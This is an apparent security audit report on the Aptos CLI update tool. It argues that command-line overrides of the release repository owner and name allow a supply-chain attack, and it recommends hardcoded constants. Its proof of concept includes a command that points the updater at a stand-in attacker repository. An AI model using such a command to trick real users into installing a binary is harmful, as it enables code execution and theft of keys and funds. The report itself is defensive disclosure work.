# Audit Report

## Title
Supply Chain Attack via Command-Line Override of Update Repository Parameters

## Summary
The `AptosUpdateTool` struct allows the `repo_owner` and `repo_name` parameters to be overridden via command-line arguments (`--repo-owner` and `--repo-name`), enabling an attacker to redirect CLI updates to a malicious GitHub repository through social engineering. [1](#0-0) 

## Finding Description

The `AptosUpdateTool` defines `repo_owner` and `repo_name` as command-line arguments with default values rather than as immutable constants. This design allows users to override these critical security parameters via command-line flags. [2](#0-1) 

These user-controlled values are then passed directly to the GitHub release fetching logic without any validation. [3](#0-2) 

An attacker could social engineer users to run: `aptos update aptos --repo-owner attacker-labs --repo-name malicious-aptos`, causing the CLI to download and install a malicious binary from the attacker's repository instead of the legitimate `aptos-labs/aptos-core`.

In contrast, the prover dependency installer correctly uses hardcoded constants that cannot be overridden: [4](#0-3) [5](#0-4) 

## Impact Explanation

**High Severity** - This vulnerability creates a supply chain attack vector that could lead to:

1. **Remote Code Execution**: Malicious binary executed with user privileges
2. **Private Key Theft**: Attacker's binary can steal private keys from user's system
3. **Fund Theft**: Compromised CLI can manipulate transactions to steal user funds
4. **Node Compromise**: If running a validator, the entire node infrastructure could be compromised

While HTTPS is used for downloads, signature validation is not implemented per the security documentation: [6](#0-5) 

This means trust is entirely placed in the GitHub repository, making repository parameter manipulation a critical vulnerability.

## Likelihood Explanation

**Medium-to-High Likelihood**:
- Requires social engineering (increases difficulty)
- CLI users implicitly trust `aptos update` commands (increases likelihood)
- No warning displayed when non-standard repositories are used (increases likelihood)
- Parameters have innocuous names that users may not recognize as dangerous (increases likelihood)
- Could be distributed via compromised tutorials, scripts, or documentation (realistic vector)

## Recommendation

Replace the command-line arguments with hardcoded constants:

```rust
// Remove these fields from AptosUpdateTool struct:
// repo_owner: String,
// repo_name: String,

// Add module-level constants:
const REPO_OWNER: &str = "aptos-labs";
const REPO_NAME: &str = "aptos-core";

// Update get_update_info() to use constants:
let config = ReleaseList::configure()
    .repo_owner(REPO_OWNER)
    .repo_name(REPO_NAME)
    .build()
    // ...

// Update build_updater() to use constants:
Update::configure()
    .repo_owner(REPO_OWNER)
    .repo_name(REPO_NAME)
    // ...
```

This matches the secure pattern used in the prover dependency installer.

## Proof of Concept

**Setup:**
1. Create a malicious GitHub repository: `attacker/fake-aptos-core`
2. Create a release with tag `aptos-cli-v99.9.9` (higher than current version)
3. Upload a malicious binary that logs all keystrokes or steals wallet files

**Exploitation:**
```bash
# Attacker social engineers user to run:
aptos update aptos --repo-owner attacker --repo-name fake-aptos-core

# The CLI will:
# 1. Fetch releases from attacker's repository
# 2. Find version 99.9.9 (higher than current)
# 3. Download and install the malicious binary
# 4. Replace the legitimate aptos CLI with attacker's version
```

**Verification:**
The vulnerability can be tested by creating a benign test repository and observing that the CLI successfully fetches and installs from the non-standard location without any security warnings.

## Notes

The security question specifically asks about environment variables and configuration files. While the code does prevent tampering via these vectors (no `env` attribute in clap configuration, no config file loading), the command-line argument override presents an equivalent security risk through a different vector. The underlying security invariant - that the update source repository must not be user-controllable - is violated regardless of the specific mechanism.

### Citations

**File:** crates/aptos/src/update/aptos.rs (L32-39)
```rust
pub struct AptosUpdateTool {
    /// The owner of the repo to download the binary from.
    #[clap(long, default_value = "aptos-labs")]
    repo_owner: String,

    /// The name of the repo to download the binary from.
    #[clap(long, default_value = "aptos-core")]
    repo_name: String,
```

**File:** crates/aptos/src/update/aptos.rs (L59-65)
```rust
    fn get_update_info(&self) -> Result<UpdateRequiredInfo> {
        // Build a configuration for determining the latest release.
        let config = ReleaseList::configure()
            .repo_owner(&self.repo_owner)
            .repo_name(&self.repo_name)
            .build()
            .map_err(|e| anyhow!("Failed to build configuration to fetch releases: {:#}", e))?;
```

**File:** crates/aptos/src/update/aptos.rs (L139-148)
```rust
        Update::configure()
            .repo_owner(&self.repo_owner)
            .repo_name(&self.repo_name)
            .bin_name("aptos")
            .current_version(current_version)
            .target_version_tag(&format!("aptos-cli-v{}", info.target_version))
            .target(target)
            .no_confirm(self.prompt_options.assume_yes)
            .build()
            .map_err(|e| anyhow!("Failed to build self-update configuration: {:#}", e))
```

**File:** crates/aptos/src/update/prover_dependencies.rs (L26-27)
```rust
pub(crate) const REPO_NAME: &str = "prover-dependency";
pub(crate) const REPO_OWNER: &str = "aptos-labs";
```

**File:** crates/aptos/src/update/prover_dependency_installer.rs (L110-111)
```rust
            REPO_OWNER.to_string(),
            REPO_NAME.to_string(),
```

**File:** RUST_SECURE_CODING.md (L8-9)
```markdown

Utilize Rustup for managing Rust toolchains. However, keep in mind that, from a security perspective, Rustup performs all downloads over HTTPS, but it does not yet validate signatures of downloads. Security is shifted to [crates.io](http://crates.io) and GitHub repository hosting the code [[rustup]](https://www.rust-lang.org/tools/install).
```
